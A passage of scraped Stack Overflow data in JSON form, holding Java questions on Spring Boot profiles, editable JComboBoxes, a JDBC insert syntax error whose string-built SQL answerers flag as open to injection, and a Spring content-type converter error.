noreferrer\">https://www.javacodegeeks.com/2019/07/profiles-spring-boot-application.html#respond</a></p>\n\n<p><strong>Here's Code What I did</strong></p>\n\n<p><code>/resources/application.properties</code></p>\n\n<pre><code>spring.profiles.default= dev\n\napplication.environment=This is a \"Default\" Environment\n</code></pre>\n\n<p><code>/resources/application-dev.properties</code></p>\n\n<pre><code>application.environment=This is a \"dev\" Environment\nserver.port= 8082\n</code></pre>\n\n<p><code>/ProfileController.java</code></p>\n\n<pre><code>@RestController\n@RequestMapping(\"/v1\")\npublic class ProfileController {\n\n    @Value(\"${application.environment}\")\n    private String applicationEnv;\n\n    @GetMapping\n    public String getApplicationEnv(){\n        return applicationEnv;\n    }\n}\n</code></pre>\n\n<h1>Result</h1>\n\n<p>localhost/v1 => This is a \"Default\" Environment</p>\n\n<p>And </p>\n\n<p>I've found out the default profile is set up as <code>dev</code> correctly.</p>\n\n<p>This is my spring-boot log.</p>\n\n<blockquote>\n  <p>2019-10-16 23:17:02.926  INFO 64099 --- [           main] c.e.s.SpringbootdemoappApplication       : No active profile set, falling back to default profiles: dev</p>\n</blockquote>\n\n<h1>Add another log for server port</h1>\n\n<blockquote>\n  <p>2019-10-17 00:25:03.837  INFO 68318 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8083 (http)</p>\n</blockquote>\n\n<p>The reason that I add is it doesn't seem a problem related with Injection.</p>\n\n<h1>Time to Close this question</h1>\n\n<p>The first goal that I want to achieve is change default profile.\nFrom spring docs(<a href=\"https://docs.spring.io/spring/docs/4.2.0.RELEASE/spring-framework-reference/htmlsingle/#beans-definition-profiles-default\" rel=\"nofollow noreferrer\">https://docs.spring.io/spring/docs/4.2.0.RELEASE/spring-framework-reference/htmlsingle/#beans-definition-profiles-default</a>), default profile can be changed as setting <code>spring.profiles.default</code> in <code>application.properties</code>.</p>\n\n<p>But it seems kind of bug (Thanks @Antoniossss). Even if I've set that in <code>application.properties</code> and the console showed <code>No active profile set, falling back to default profiles: dev</code>.\nHowever still <code>dev</code> profile wasn't activated.</p>\n\n<p>The thing that I've found out is <strong>changing default profile should be done before loading application.properties</strong>.</p>\n\n<p>It means if changing default profile is described in <code>application.properties</code>, it's too late.(IDK why though, I can't figure out because there are so many layers in Spring ...)\nIf dfaut profile is set up using <code>-Dspring.default.profile = dev</code> , it's working properly. </p>\n\n<p>From <a href=\"https://github.com/spring-projects/spring-boot/issues/1219\" rel=\"nofollow noreferrer\">https://github.com/spring-projects/spring-boot/issues/1219</a>:</p>\n\n<blockquote>\n  <p>You can't change the default profile by declaring it in a config file. It has to be in place before the config files are read.</p>\n</blockquote>\n"},{"tags":["java","swing","jtextfield","jcombobox"],"comments":[{"owner":{"account_id":18453936,"reputation":23,"user_id":17419233,"display_name":"Bigggie"},"score":0,"creation_date":1640261804,"post_id":70460744,"comment_id":124555521,"body_markdown":"That does not help. That method lets you edit the textfield, but only with text that is already in the drop-down, which is exactly my problem. My combobox is already set as editable.","body":"That does not help. That method lets you edit the textfield, but only with text that is already in the drop-down, which is exactly my problem. My combobox is already set as editable."},{"owner":{"account_id":114128,"reputation":50422,"user_id":300257,"accept_rate":89,"display_name":"Gilbert Le Blanc"},"score":1,"creation_date":1640269839,"post_id":70460744,"comment_id":124558245,"body_markdown":"Perhaps what you really need is an [auto-complete JTextField](http://www.java2s.com/Code/Java/Swing-JFC/AutocompleteTextField.htm).  It&#39;s hard to tell without your editing your question to include a [mre].","body":"Perhaps what you really need is an <a href=\"http://www.java2s.com/Code/Java/Swing-JFC/AutocompleteTextField.htm\" rel=\"nofollow noreferrer\">auto-complete JTextField</a>.  It&#39;s hard to tell without your editing your question to include a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."},{"owner":{"account_id":18453936,"reputation":23,"user_id":17419233,"display_name":"Bigggie"},"score":0,"creation_date":1640271270,"post_id":70460744,"comment_id":124558757,"body_markdown":"See my edited post. Does that still contain the dropdown feature?","body":"See my edited post. Does that still contain the dropdown feature?"},{"owner":{"account_id":114128,"reputation":50422,"user_id":300257,"accept_rate":89,"display_name":"Gilbert Le Blanc"},"score":1,"creation_date":1640271726,"post_id":70460744,"comment_id":124558921,"body_markdown":"Okay, why are the search results in a `JComboBox`?  What happens when a user selects one of the search results?  It seems to me like you need a separate `JTextField` and a non-editable `JComboBox`.","body":"Okay, why are the search results in a <code>JComboBox</code>?  What happens when a user selects one of the search results?  It seems to me like you need a separate <code>JTextField</code> and a non-editable <code>JComboBox</code>."},{"owner":{"account_id":18453936,"reputation":23,"user_id":17419233,"display_name":"Bigggie"},"score":0,"creation_date":1640272662,"post_id":70460744,"comment_id":124559275,"body_markdown":"Because I wanted the dropdown feature which doesn&#39;t come with a `JTextField `, but using a separate `JTextField` and a non-editable `JComboBox` sounds like a good idea. I will try that!","body":"Because I wanted the dropdown feature which doesn&#39;t come with a <code>JTextField </code>, but using a separate <code>JTextField</code> and a non-editable <code>JComboBox</code> sounds like a good idea. I will try that!"}],"owner":{"account_id":18453936,"reputation":23,"user_id":17419233,"display_name":"Bigggie"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":100,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640270972,"creation_date":1640254972,"question_id":70460744,"body_markdown":"I want to be able to type anything in a JComboBox, even input that does not already exist in the dropdown. I need this because I need the drop-down suggestion feature. I have an api that provides me with some data(search results), when searching for a key word I need suggestions in a drop-down which I have managed with a custom model, but the JComboBox only lets me write input that already exists in the drop-down? How can I make it so the combobox allows all input?\r\n\r\nEdit:\r\n\r\nTo clarify what I want my program to do: I type in some word in a search bar and click search. Through a connection to my api it searches if there are any matching results. If there are I want it to display those in a dropdown list. So it is not as if there are any fixed alternatives to choose from in the combobox, like color, country etc, but instead you search and then the alternatives pop up. Something like this without including too many details:\r\n```\r\nJPanel panel = new JPanel();\r\nJButton search = new JButton(&quot;Search&quot;);\r\nJComboBox list = new JComboBox();\r\nAutoCompleteDecorator.decorate(list);\r\nlist.setEditable(true);\r\npanel.add(search);\r\npanel.add(list);\r\n\r\nsearch.addActionListener(e-&gt;{\r\n            //connects to api, reads input in searchbar, searches for the input in api\r\n\t\t\tArrayList&lt;String&gt; name = //list of all matching results from api\r\n\t\t\tlist.setModel(new ComboBoxModel(name));\r\n\t\t});\r\n```\r\nBut this doesn&#39;t work because the combobox doesnt let me write whatever I want in the field, it only lets my write words that already are stored in the combobox, which in my case is none to begin with. I have made sure that the other parts (the model, api) work, so it is just that I want the text field to be &quot;more editable&quot;.\r\n","title":"How to type anything in JComboBox","body":"<p>I want to be able to type anything in a JComboBox, even input that does not already exist in the dropdown. I need this because I need the drop-down suggestion feature. I have an api that provides me with some data(search results), when searching for a key word I need suggestions in a drop-down which I have managed with a custom model, but the JComboBox only lets me write input that already exists in the drop-down? How can I make it so the combobox allows all input?</p>\n<p>Edit:</p>\n<p>To clarify what I want my program to do: I type in some word in a search bar and click search. Through a connection to my api it searches if there are any matching results. If there are I want it to display those in a dropdown list. So it is not as if there are any fixed alternatives to choose from in the combobox, like color, country etc, but instead you search and then the alternatives pop up. Something like this without including too many details:</p>\n<pre><code>JPanel panel = new JPanel();\nJButton search = new JButton(&quot;Search&quot;);\nJComboBox list = new JComboBox();\nAutoCompleteDecorator.decorate(list);\nlist.setEditable(true);\npanel.add(search);\npanel.add(list);\n\nsearch.addActionListener(e-&gt;{\n            //connects to api, reads input in searchbar, searches for the input in api\n            ArrayList&lt;String&gt; name = //list of all matching results from api\n            list.setModel(new ComboBoxModel(name));\n        });\n</code></pre>\n<p>But this doesn't work because the combobox doesnt let me write whatever I want in the field, it only lets my write words that already are stored in the combobox, which in my case is none to begin with. I have made sure that the other parts (the model, api) work, so it is just that I want the text field to be &quot;more editable&quot;.</p>\n"},{"tags":["java","sql","insert","syntax-error"],"comments":[{"owner":{"account_id":21706727,"reputation":1201,"user_id":16019058,"display_name":"Shmiel"},"score":0,"creation_date":1640270245,"post_id":70463560,"comment_id":124558370,"body_markdown":"`mysql` or `sql-server`?","body":"<code>mysql</code> or <code>sql-server</code>?"},{"owner":{"account_id":2312068,"reputation":90341,"user_id":2029983,"display_name":"Thom A"},"score":0,"creation_date":1640270333,"post_id":70463560,"comment_id":124558406,"body_markdown":"Or perhaps PostgeSQL (based on the lines `String protocol = &quot;jdbc:postgresql://&quot;;` and `------ Testing PostgreSQL JDBC Connection ------`... Tag properly, don&#39;t just spam them","body":"Or perhaps PostgeSQL (based on the lines <code>String protocol = &quot;jdbc:postgresql:&#47;&#47;&quot;;</code> and <code>------ Testing PostgreSQL JDBC Connection ------</code>... Tag properly, don&#39;t just spam them"},{"owner":{"account_id":2312068,"reputation":90341,"user_id":2029983,"display_name":"Thom A"},"score":0,"creation_date":1640270354,"post_id":70463560,"comment_id":124558414,"body_markdown":"`boolean result = st.execute(&quot;DROP TABLE IF EXISTS &quot; + table);` also looks dangerously open to injection attacks.","body":"<code>boolean result = st.execute(&quot;DROP TABLE IF EXISTS &quot; + table);</code> also looks dangerously open to injection attacks."},{"owner":{"account_id":8591840,"reputation":46475,"user_id":6436191,"display_name":"The Impaler"},"score":0,"creation_date":1640270569,"post_id":70463560,"comment_id":124558489,"body_markdown":"Just a note. Though it perfectly doable, real world apps rarely create and drop tables on the fly. Data is too valuable to lose it by a typo.","body":"Just a note. Though it perfectly doable, real world apps rarely create and drop tables on the fly. Data is too valuable to lose it by a typo."}],"answers":[{"tags":[],"owner":{"account_id":401843,"reputation":89788,"user_id":768644,"display_name":"rzwitserloot"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640270704,"creation_date":1640270704,"answer_id":70463671,"question_id":70463560,"body_markdown":"__This code is a security vulnerability__. Specifically, SQL injection. This is not how you do it.\r\n\r\nThe correct way also solves your problem in passing. Thus, solution: Do it the correct way, solves all your problems.\r\n\r\nCorrect way:\r\n\r\n```java\r\nPreparedStatement ps = con.prepareStatement(&quot;INSERT INTO &quot; + table + &quot; VALUES (?, ?, ?, ?)&quot;);\r\nps.setString(1, values[0]);\r\nps.setString(2, values[1]);\r\nps.setString(3, values[2]);\r\nps.setString(4, values[3]);\r\nps.executeUpdate();\r\n```\r\n\r\n","title":"having trouble inserting values into table with syntax error","body":"<p><strong>This code is a security vulnerability</strong>. Specifically, SQL injection. This is not how you do it.</p>\n<p>The correct way also solves your problem in passing. Thus, solution: Do it the correct way, solves all your problems.</p>\n<p>Correct way:</p>\n<pre class=\"lang-java prettyprint-override\"><code>PreparedStatement ps = con.prepareStatement(&quot;INSERT INTO &quot; + table + &quot; VALUES (?, ?, ?, ?)&quot;);\nps.setString(1, values[0]);\nps.setString(2, values[1]);\nps.setString(3, values[2]);\nps.setString(4, values[3]);\nps.executeUpdate();\n</code></pre>\n"}],"owner":{"account_id":23729720,"reputation":5,"user_id":17749152,"display_name":"Dramus17"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":581,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"accepted_answer_id":70463671,"answer_count":1,"score":-1,"last_activity_date":1640270704,"creation_date":1640270174,"question_id":70463560,"body_markdown":"Everytime at around &quot;composedLine = String.format(&quot;%s, %s, %s, %s, %s&quot;, composedLine,\r\n\t\t\t\t values[0], values[1], values[2], values[3]);&quot;\r\nit produces &quot;INSERT INTO airport VALUES (, ABR, Aberdeen Regional Airport, Aberdeen&quot;\r\n\r\ninstead of &quot;INSERT INTO airport VALUES (ABR, Aberdeen Regional Airport, Aberdeen&quot;\r\n\r\nwhich causes a syntax error when I use executeupdate due to the &quot;,&quot; before the ABR.\r\n\r\n\r\n    import java.io.*;\r\n    import java.sql.*;\r\n    import java.util.*;\r\n    \r\n    public class UsaDelayFlight {\r\n    \t\r\n    \r\n    \r\n    \t\t\r\n    \t\r\n    \r\n        public static Connection connectToDatabase(String user, String password, String database) {\r\n        \t\tSystem.out.println(&quot;------ Testing PostgreSQL JDBC Connection ------&quot;);\r\n        \t\tConnection connection = null;\r\n        \t\ttry {\r\n        \t\t\tString protocol = &quot;jdbc:postgresql://&quot;;\r\n        \t\t\tString dbName = &quot;&quot;;\r\n        \t\t\tString fullURL = protocol + database + dbName + user;\r\n        \t\t\tconnection = DriverManager.getConnection(fullURL, user, password);\r\n        \t\t} catch (SQLException e) {\r\n        \t\t\tString errorMsg = e.getMessage();\r\n        \t\t\tif (errorMsg.contains(&quot;authentication failed&quot;)) {\r\n        \t\t\t\tSystem.out.println(&quot;ERROR: \\tDatabase password is incorrect. Have you changed the password string above?&quot;);\r\n        \t\t\t\tSystem.out.println(&quot;\\n\\tMake sure you are NOT using your university password.\\n&quot;\r\n        \t\t\t\t\t\t+ &quot;\\tYou need to use the password that was emailed to you!&quot;);\r\n        \t\t\t} else {\r\n        \t\t\t\tSystem.out.println(&quot;Connection failed! Check output console.&quot;);\r\n        \t\t\t\te.printStackTrace();\r\n        \t\t\t}\r\n        \t\t}\r\n        \t\treturn connection;\r\n        \t}\r\n        \t\r\n        \tpublic static void dropTable(Connection connection, String table) throws SQLException  {\r\n        \t\tStatement st = null;\r\n        \t\ttry {\r\n        \t\tst = connection.createStatement();\r\n        \t\tboolean result = st.execute(&quot;DROP TABLE IF EXISTS &quot; + table);\r\n        \t\t} catch (SQLException e) {\r\n        \t\t\te.printStackTrace();\r\n        \t\t}\r\n        \t\tst.close();\r\n        \t}\r\n        \t\r\n        \tpublic static void createTable(Connection connection, String tableDescription) throws SQLException  {\r\n        \t\tStatement st = null;\r\n        \t\ttry {\r\n        \t\tst = connection.createStatement();\r\n        \t\tboolean result = st.execute(&quot;CREATE TABLE IF NOT EXISTS &quot; + tableDescription);\r\n        \t\t} catch (SQLException e) {\r\n        \t\t\te.printStackTrace();\r\n        \t\t}\r\n        \t\tst.close();\r\n        \t}\r\n        \t\r\n        \tpublic static ResultSet executeQuery(Connection connection, String query) {\r\n        \t\t System.out.println(&quot;DEBUG: Executing query...&quot;);\r\n        \t\t try {\r\n        \t\t Statement st = connection.createStatement();\r\n        \t\t ResultSet rs = st.executeQuery(query);\r\n        \t\t return rs;\r\n        \t\t } catch (SQLException e) {\r\n        \t\t e.printStackTrace();\r\n        \t\t return null;\r\n        \t\t }\r\n        \t\t }\r\n        \t\r\n        \tpublic static int insertIntoTableFromFile(Connection connection, String table, \r\n        \t\t\tString filename) {\r\n        \t\tint numRows = 0;\r\n        \t\tString currentLine = null;\r\n        \t\ttry {\r\n        \t\tBufferedReader br = new BufferedReader(new FileReader(filename));\r\n        \t\tStatement st = connection.createStatement();\r\n        \t\t// Read in each line of the file until we reach the end.\r\n        \t\twhile ((currentLine = br.readLine()) != null) {\r\n        \t\tString[] values = currentLine.split(&quot;,&quot;);\r\n        \t\tSystem.out.println(Arrays.toString(values));\r\n        \t\tString composedLine = &quot;INSERT INTO &quot; + table + &quot; VALUES (&quot;;\r\n        \t\t//String r = String.format(&quot;formatted values are %s&quot;, composedLine);\r\n        \t\tcomposedLine = String.format(&quot;%s, %s, %s, %s&quot;, composedLine,\r\n        \t\t\t\t values[0], values[1], values[2], values[3]);\r\n        \t\tSystem.out.println(composedLine);\r\n        \t\t //. . .\r\n        \t\t// Finally, execute the entire composed line.\r\n        \t\tnumRows = st.executeUpdate(composedLine);\r\n        \t\t}\r\n        \t\t} catch (Exception e) {\r\n        \t\te.printStackTrace();\r\n        \t\t}\r\n        \t\treturn numRows;\r\n        \t}\r\n        \t\r\n        \t\r\n        \t\t\r\n        \t\t// NOTE: You will need to change some variables from START to END.\r\n        \t\t\tpublic static void main(String[] argv) throws SQLException {\r\n        \t\t\t\t// START\r\n        \t\t\t\t// Enter your username.\r\n        \t\t\t\tString user = &quot;&quot;;\r\n        \t\t\t\t// Enter your database password, NOT your university password.\r\n        \t\t\t\tString password = &quot;&quot;;\r\n        \t\t\t\t\r\n        \t\t\t\t/** IMPORTANT: If you are using NoMachine, you can leave this as it is.\r\n        \t\t\t\t * \r\n        \t\t\t \t *  Otherwise, if you are using your OWN COMPUTER with TUNNELLING:\r\n        \t\t\t \t * \t\t1) Delete the original database string and \r\n        \t\t\t \t * \t\t2) Remove the &#39;//&#39; in front of the second database string.\r\n        \t\t\t \t */\r\n        \t\t\t\tString database = &quot;&quot;;\r\n        \t\t\t\t//String database = &quot;&quot;;\r\n        \t\t\t\t// END\r\n        \t\t\t\t\r\n        \t\t\t\tConnection connection = connectToDatabase(user, password, database);\r\n        \t\t\t\tif (connection != null) {\r\n        \t\t\t\t\tSystem.out.println(&quot;SUCCESS: You made it!&quot;\r\n        \t\t\t\t\t\t\t+ &quot;\\n\\t You can now take control of your database!\\n&quot;);\r\n        \t\t\t\t} else {\r\n        \t\t\t\t\tSystem.out.println(&quot;ERROR: \\tFailed to make connection!&quot;);\r\n        \t\t\t\t\tSystem.exit(1);\r\n        \t\t\t\t}\r\n        \t\t\t\t// Now we&#39;re ready to use the DB. You may add your code below this line.\r\n        \t\t\t\tcreateTable(connection, &quot;delayedFlights (ID_of_Delayed_Flight varchar(15) not null, Month varchar(10), &quot;\r\n        \t\t\t\t\t\t+ &quot;DayofMonth int, DayofWeek int, DepTime timestamp, ScheduledDepTime timestamp, ArrTime int,&quot;\r\n        \t\t\t\t\t\t+ &quot;ScheduledArrTime timestamp, UniqueCarrier varchar(15) not null, FlightNum int, ActualFlightTime timestamp,&quot;\r\n        \t\t\t\t\t\t+ &quot;scheduledFlightTime timestamp, AirTime timestamp, ArrDelay timestamp, DepDelay timestamp, Orig varchar(15),&quot;\r\n        \t\t\t\t\t\t+ &quot;Dest varchar(15), Distance int, primary key (ID_of_Delayed_Flight), unique (UniqueCarrier));&quot;);\r\n        \t\t\t\t\r\n        \t\t\t\tcreateTable(connection, &quot;airport (airportCode varchar(15) not null, &quot;\r\n        \t\t\t\t\t\t+ &quot;airportName varchar(15), City varchar(15), State varchar(15), primary key (airportCode));&quot;);\r\n        \t\t\t\t\r\n        \t\t\t\tinsertIntoTableFromFile(connection, &quot;airport&quot;, &quot;airport&quot;);\r\n        \t\t\t\tString query = &quot;SELECT * FROM delayedFlights;&quot;;\r\n        \t\t\t\t ResultSet rs = executeQuery(connection, query);\r\n        \t\t\t\t try {\r\n        \t\t\t\t while (rs.next()) {\r\n        \t\t\t\t System.out.println(rs.getString(1)+&quot; &quot;+rs.getString(2)+&quot; &quot;+rs.getString(3));\r\n        \t\t\t\t }\r\n        \t\t\t\t } catch (SQLException e) {\r\n        \t\t\t\te.printStackTrace();\r\n        \t\t\t\t }\r\n        \t\t\t\t rs.close();\r\n        \t\t\t}\r\n        \t\t\t\r\n        \r\n        }\r\n\r\n","title":"having trouble inserting values into table with syntax error","body":"<p>Everytime at around &quot;composedLine = String.format(&quot;%s, %s, %s, %s, %s&quot;, composedLine,\nvalues[0], values[1], values[2], values[3]);&quot;\nit produces &quot;INSERT INTO airport VALUES (, ABR, Aberdeen Regional Airport, Aberdeen&quot;</p>\n<p>instead of &quot;INSERT INTO airport VALUES (ABR, Aberdeen Regional Airport, Aberdeen&quot;</p>\n<p>which causes a syntax error when I use executeupdate due to the &quot;,&quot; before the ABR.</p>\n<pre><code>import java.io.*;\nimport java.sql.*;\nimport java.util.*;\n\npublic class UsaDelayFlight {\n    \n\n\n        \n    \n\n    public static Connection connectToDatabase(String user, String password, String database) {\n            System.out.println(&quot;------ Testing PostgreSQL JDBC Connection ------&quot;);\n            Connection connection = null;\n            try {\n                String protocol = &quot;jdbc:postgresql://&quot;;\n                String dbName = &quot;&quot;;\n                String fullURL = protocol + database + dbName + user;\n                connection = DriverManager.getConnection(fullURL, user, password);\n            } catch (SQLException e) {\n                String errorMsg = e.getMessage();\n                if (errorMsg.contains(&quot;authentication failed&quot;)) {\n                    System.out.println(&quot;ERROR: \\tDatabase password is incorrect. Have you changed the password string above?&quot;);\n                    System.out.println(&quot;\\n\\tMake sure you are NOT using your university password.\\n&quot;\n                            + &quot;\\tYou need to use the password that was emailed to you!&quot;);\n                } else {\n                    System.out.println(&quot;Connection failed! Check output console.&quot;);\n                    e.printStackTrace();\n                }\n            }\n            return connection;\n        }\n        \n        public static void dropTable(Connection connection, String table) throws SQLException  {\n            Statement st = null;\n            try {\n            st = connection.createStatement();\n            boolean result = st.execute(&quot;DROP TABLE IF EXISTS &quot; + table);\n            } catch (SQLException e) {\n                e.printStackTrace();\n            }\n            st.close();\n        }\n        \n        public static void createTable(Connection connection, String tableDescription) throws SQLException  {\n            Statement st = null;\n            try {\n            st = connection.createStatement();\n            boolean result = st.execute(&quot;CREATE TABLE IF NOT EXISTS &quot; + tableDescription);\n            } catch (SQLException e) {\n                e.printStackTrace();\n            }\n            st.close();\n        }\n        \n        public static ResultSet executeQuery(Connection connection, String query) {\n             System.out.println(&quot;DEBUG: Executing query...&quot;);\n             try {\n             Statement st = connection.createStatement();\n             ResultSet rs = st.executeQuery(query);\n             return rs;\n             } catch (SQLException e) {\n             e.printStackTrace();\n             return null;\n             }\n             }\n        \n        public static int insertIntoTableFromFile(Connection connection, String table, \n                String filename) {\n            int numRows = 0;\n            String currentLine = null;\n            try {\n            BufferedReader br = new BufferedReader(new FileReader(filename));\n            Statement st = connection.createStatement();\n            // Read in each line of the file until we reach the end.\n            while ((currentLine = br.readLine()) != null) {\n            String[] values = currentLine.split(&quot;,&quot;);\n            System.out.println(Arrays.toString(values));\n            String composedLine = &quot;INSERT INTO &quot; + table + &quot; VALUES (&quot;;\n            //String r = String.format(&quot;formatted values are %s&quot;, composedLine);\n            composedLine = String.format(&quot;%s, %s, %s, %s&quot;, composedLine,\n                     values[0], values[1], values[2], values[3]);\n            System.out.println(composedLine);\n             //. . .\n            // Finally, execute the entire composed line.\n            numRows = st.executeUpdate(composedLine);\n            }\n            } catch (Exception e) {\n            e.printStackTrace();\n            }\n            return numRows;\n        }\n        \n        \n            \n            // NOTE: You will need to change some variables from START to END.\n                public static void main(String[] argv) throws SQLException {\n                    // START\n                    // Enter your username.\n                    String user = &quot;&quot;;\n                    // Enter your database password, NOT your university password.\n                    String password = &quot;&quot;;\n                    \n                    /** IMPORTANT: If you are using NoMachine, you can leave this as it is.\n                     * \n                     *  Otherwise, if you are using your OWN COMPUTER with TUNNELLING:\n                     *      1) Delete the original database string and \n                     *      2) Remove the '//' in front of the second database string.\n                     */\n                    String database = &quot;&quot;;\n                    //String database = &quot;&quot;;\n                    // END\n                    \n                    Connection connection = connectToDatabase(user, password, database);\n                    if (connection != null) {\n                        System.out.println(&quot;SUCCESS: You made it!&quot;\n                                + &quot;\\n\\t You can now take control of your database!\\n&quot;);\n                    } else {\n                        System.out.println(&quot;ERROR: \\tFailed to make connection!&quot;);\n                        System.exit(1);\n                    }\n                    // Now we're ready to use the DB. You may add your code below this line.\n                    createTable(connection, &quot;delayedFlights (ID_of_Delayed_Flight varchar(15) not null, Month varchar(10), &quot;\n                            + &quot;DayofMonth int, DayofWeek int, DepTime timestamp, ScheduledDepTime timestamp, ArrTime int,&quot;\n                            + &quot;ScheduledArrTime timestamp, UniqueCarrier varchar(15) not null, FlightNum int, ActualFlightTime timestamp,&quot;\n                            + &quot;scheduledFlightTime timestamp, AirTime timestamp, ArrDelay timestamp, DepDelay timestamp, Orig varchar(15),&quot;\n                            + &quot;Dest varchar(15), Distance int, primary key (ID_of_Delayed_Flight), unique (UniqueCarrier));&quot;);\n                    \n                    createTable(connection, &quot;airport (airportCode varchar(15) not null, &quot;\n                            + &quot;airportName varchar(15), City varchar(15), State varchar(15), primary key (airportCode));&quot;);\n                    \n                    insertIntoTableFromFile(connection, &quot;airport&quot;, &quot;airport&quot;);\n                    String query = &quot;SELECT * FROM delayedFlights;&quot;;\n                     ResultSet rs = executeQuery(connection, query);\n                     try {\n                     while (rs.next()) {\n                     System.out.println(rs.getString(1)+&quot; &quot;+rs.getString(2)+&quot; &quot;+rs.getString(3));\n                     }\n                     } catch (SQLException e) {\n                    e.printStackTrace();\n                     }\n                     rs.close();\n                }\n                \n    \n    }\n</code></pre>\n"},{"tags":["java","spring","http","servlets"],"comments":[{"owner":{"account_id":5281408,"reputation":18797,"user_id":4216641,"display_name":"Turing85"},"score":1,"creation_date":1640271718,"post_id":70463664,"comment_id":124558919,"body_markdown":"Is there a specific reason why you return a `HttpEntity`? I would have expected an `ResponseEntity&lt;String&gt;` or just a `String` as return-type.","body":"Is there a specific reason why you return a <code>HttpEntity</code>? I would have expected an <code>ResponseEntity&lt;String&gt;</code> or just a <code>String</code> as return-type."},{"owner":{"account_id":20484624,"reputation":51,"user_id":15032086,"display_name":"Facundo Humphreys"},"score":0,"creation_date":1640273395,"post_id":70463664,"comment_id":124559498,"body_markdown":"When I return just a String I don&#39;t get the formatting I want. Do you know how can I return a String formatting \\n and \\t?","body":"When I return just a String I don&#39;t get the formatting I want. Do you know how can I return a String formatting \\n and \\t?"},{"owner":{"account_id":20484624,"reputation":51,"user_id":15032086,"display_name":"Facundo Humphreys"},"score":0,"creation_date":1640273611,"post_id":70463664,"comment_id":124559567,"body_markdown":"I get this response instead of formatting the string correctly&quot;(\\n\\tNOT (\\n\\t\\t(\\n\\t\\t\\t&quot;","body":"I get this response instead of formatting the string correctly&quot;(\\n\\tNOT (\\n\\t\\t(\\n\\t\\t\\t&quot;"}],"owner":{"account_id":20484624,"reputation":51,"user_id":15032086,"display_name":"Facundo Humphreys"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":515,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1640270663,"creation_date":1640270663,"question_id":70463664,"body_markdown":"I&#39;m trying to return a formatted string from a endpoint with spring, with the following code\r\n```\r\nprivate static class Json\r\n            implements Serializable {\r\n        private final String value;\r\n\r\n        public Json(String value) {\r\n            this.value = value;\r\n        }\r\n\r\n        public String getValue() {\r\n            return this.value;\r\n        }\r\n\r\n        @Override\r\n        public String toString() {\r\n            return &quot;Json{&quot; +\r\n                    &quot;value=&#39;&quot; + value + &#39;\\&#39;&#39; +\r\n                    &#39;}&#39;;\r\n        }\r\n    }\r\n    @RequestMapping(value = &quot;/description&quot;, method = RequestMethod.GET)\r\n    public HttpEntity&lt;String&gt; retrieveDescription() {\r\n\r\n        String text = this.retrieveDescription();\r\n        HttpHeaders headers = new HttpHeaders();\r\n        headers.setContentType(MediaType.TEXT_PLAIN);\r\n\r\n        return new HttpEntity&lt;String&gt;(text, headers);\r\n    }\r\n```\r\nBut when I execute the request I get the following error\r\n\r\n&gt; No converter for [class java.lang.String] with preset Content-Type &#39;text/plain&#39;\r\n\r\nI&#39;ve tried returning the Json class but still the same problem\r\nAny idea how to solve it?","title":"No converter for [class java.lang.String] with preset Content-Type &#39;text/plain&#39;","body":"<p>I'm trying to return a formatted string from a endpoint with spring, with the following code</p>\n<pre><code>private static class Json\n            implements Serializable {\n        private final String value;\n\n        public Json(String value) {\n            this.value = value;\n        }\n\n        public String getValue() {\n            return this.value;\n        }\n\n        @Override\n        public String toString() {\n            return &quot;Json{&quot; +\n                    &quot;value='&quot; + value + '\\'' +\n                    '}';\n        }\n    }\n    @RequestMapping(value = &quot;/description&quot;, method = RequestMethod.GET)\n    public HttpEntity&lt;String&gt; retrieveDescription() {\n\n        String text = this.retrieveDescription();\n        HttpHeaders headers = new HttpHeaders();\n        headers.setContentType(MediaType.TEXT_PLAIN);\n\n        return new HttpEntity&lt;String&gt;(text, headers);\n    }\n</code></pre>\n<p>But when I execute the request I get the following error</p>\n<blockquote>\n<p>No converter for [class java.lang.String] with preset Content-Type 'text/plain'</p>\n</blockquote>\n<p>I've tried returning the Json class but still the same problem\nAny idea how to solve it?</p>\n"},{"tags":["java","spring-boot","maven","windows-subsystem-for-linux"],"comments":[{"owner":{"account_id":16914570,"reputation":1532,"user_id":12232870,"display_name":"terrorrussia-keeps-killing"},"score":0,"creation_date":1640272076,"post_id":70463640,"comment_id":124559070,"body_markdown":"I&#39;m not sure but isn&#39;t the version of the `spring-boot-maven-plugin` plugin different in both cases? Additionally, it looks like the `profiles` element can only accept a string (optionally delimiting multiple values by comma) whilst your `pom.xml` snippet looks like you&#39;ve moved the Maven profiles section right into the plugin configuration which is illegal.","body":"I&#39;m not sure but isn&#39;t the version of the <code>spring-boot-maven-plugin</code> plugin different in both cases? Additionally, it looks like the <code>profiles</code> element can only accept a string (optionally delimiting multiple values by comma) whilst your <code>pom.xml</code> snippet looks like you&#39;ve moved the Maven profiles section right into the plugin configuration which is illegal."},{"owner":{"account_id":112317,"reputation":93939,"user_id":296328,"accept_rate":60,"display_name":"khmarbaise"},"score":0,"creation_date":1640272090,"post_id":70463640,"comment_id":124559075,"body_markdown":"The issue looks like a problem with the Maven package in Ubuntu distro...  see https://stackoverflow.com/a/67482132/296328 second why are you combining Maven Profiles with spring boot profiles?","body":"The issue looks like a problem with the Maven package in Ubuntu distro...  see <a href=\"https://stackoverflow.com/a/67482132/296328\">stackoverflow.com/a/67482132/296328</a> second why are you combining Maven Profiles with spring boot profiles?"},{"owner":{"account_id":112317,"reputation":93939,"user_id":296328,"accept_rate":60,"display_name":"khmarbaise"},"score":0,"creation_date":1640272162,"post_id":70463640,"comment_id":124559097,"body_markdown":"You should first check if your build is working without any issue on plain command line via `mvn clean package` afterwards I would check the issue warning about guice ....","body":"You should first check if your build is working without any issue on plain command line via <code>mvn clean package</code> afterwards I would check the issue warning about guice ...."},{"owner":{"account_id":112317,"reputation":93939,"user_id":296328,"accept_rate":60,"display_name":"khmarbaise"},"score":0,"creation_date":1640272345,"post_id":70463640,"comment_id":124559177,"body_markdown":"The configuration for the profiles for 